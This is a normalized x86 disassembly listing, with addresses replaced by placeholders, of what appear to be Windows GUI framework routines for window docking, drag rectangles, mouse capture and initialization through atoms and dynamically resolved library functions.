jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_441a5b
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_4418b0
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441aac
lea eax [ ebp - 0x14 ]
call sub_404050
retn
sub_441ab4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_440204
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44022c
call sub_441ab4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_440204
call sub_441ab4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_43fc34
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_44012c
mov edx eax
mov eax ebx
call sub_440154
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_440154
jmp r-xdata
sub_441b3c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_441ab4
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_441b80
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44012c
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_440154
sub_441bb0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_43df6c
mov edx eax
mov eax [ rw-data ]
call sub_442710
mov eax [ ebx + 0x14 ]
call sub_43df6c
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_441cc4
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_441c10
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_442710
mov eax ebx
call sub_441cc4
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_440154
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_440154
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_441b3c
push ebx
push sub_441cb4
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4404e0
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_441c8c
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_43ca08
test eax eax
jle r-xdata
push ebx
push sub_441cb4
xor edx edx
mov eax ebx
call sub_4404e0
sub_441cc4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_43fcf8
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_43fcf8
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_43fd64
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_43fd64
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41e1b8
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_441db0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_441db0
pop ecx
mov eax ebx
call sub_44012c
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44012c
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_441db0
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44012c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4232f0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_441e40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44012c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43fcb0
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_44012c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_441db0
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441e90
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43714c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43714c
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_441f0c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43fbbc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_43fc68
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_440210
test eax eax
je r-xdata
mov eax esi
call sub_43fc34
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_441cb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4404e0
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_440210
mov edx [ ebx + 0x20 ]
call sub_440168
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_441f0c
pop ecx
sub_441f8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43fc18
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_43fc18
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_440210
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_441f8c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_441cb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_4404e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_43fe14
mov eax edi
call sub_440204
test eax eax
je r-xdata
mov eax edi
call sub_440210
mov esi eax
mov eax esi
call sub_44012c
push eax
mov eax esi
call sub_43fc68
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_440204
call sub_44012c
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_44012c
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_440154
mov eax esi
call sub_44012c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_440154
mov eax edi
call sub_440210
call sub_4401a4
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_43fc68
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_440154
mov eax edi
call sub_440204
call sub_4401a4
mov bl 0x1
jmp r-xdata
sub_4420c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_440478
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412ce0
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_440c6c
test eax eax
je r-xdata
push ebp
call sub_441f0c
pop ecx
push ebp
call sub_441f8c
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_441e90
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44214c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_43fcf8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_43fcf8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_441e40
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_441e40
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_4421dc
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4425b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069f0
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_440c6c
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_441c10
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f0
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_440c6c
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4372f0
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4425bb
lea eax [ ebp - 0x48 ]
call sub_404050
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43df6c
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43600c
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4384c4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404050
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4420c4
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43ca9c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_441cc4
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069f0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44214c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_441cc4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f0
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_440c6c
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_4376cc
jmp r-xdata
mov eax edi
call sub_4536b4
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_440c6c
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43714c
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_4377ac
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_4040a4
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441bb0
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454db4
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43df6c
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_437e6c
jmp r-xdata
sub_4425c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_442738
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_442654
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_442710
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4426b8
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_4426e8
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406ae4
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_442710
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_442684
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_442738
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44269c
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_4426b8
pop ebx
retn
mov eax ebx
call sub_4426e8
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44279c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442902
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_442a20
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_442a04
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_442a04
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_442b10
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403294
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403294
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403294
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403294
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404050
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404050
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_442b98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442d10
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408d10
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4040a4
mov eax [ rw-data ]
call sub_404510
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4040a4
mov eax [ rw-data ]
call sub_404510
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404510
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ rw-data ] eax
call sub_44279c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4425c4
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_454690
